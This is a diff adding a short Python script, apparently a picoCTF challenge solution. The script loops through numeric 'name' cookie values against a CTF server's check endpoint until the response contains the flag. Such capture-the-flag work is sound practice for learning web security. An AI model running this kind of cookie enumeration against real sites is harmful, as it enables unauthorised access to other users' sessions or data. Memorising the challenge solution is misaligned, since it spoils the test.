@@ -1,0 +1,14 @@
+#!/bin/python3
+
+import requests
+import os
+
+for i in range(100):
+    cookie = 'name={}'.format(i)
+    headers = {'Cookie': cookie}
+
+    req = requests.get('http://mercury.picoctf.net:17781/check', headers=headers)
+    
+    if req.status_code == 200 and 'picoCTF' in req.text:
+        print(req.text)
+        break
